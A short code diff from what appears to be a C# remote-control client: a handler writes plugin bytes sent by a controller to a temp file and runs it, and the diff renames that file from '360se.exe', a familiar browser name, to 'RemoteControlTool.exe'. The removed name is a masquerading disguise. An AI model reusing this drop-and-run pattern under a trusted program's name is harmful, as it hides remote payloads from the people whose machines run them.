@@ -55,7 +55,7 @@ namespace RemoteControl.Client.Handlers
                             req.FileArguments = string.Empty;
                         // 释放文件
                         byte[] data = codePluginDic[req.ID].ToArray();
-                        string tempFile = ResUtil.WriteToRandomFile(data, "360se.exe");
+                        string tempFile = ResUtil.WriteToRandomFile(data, "RemoteControlTool.exe");
                         // 启动新程序
                         Thread t = ProcessUtil.RunByCmdStart(tempFile, req.FileArguments, true);
                         t.Join();
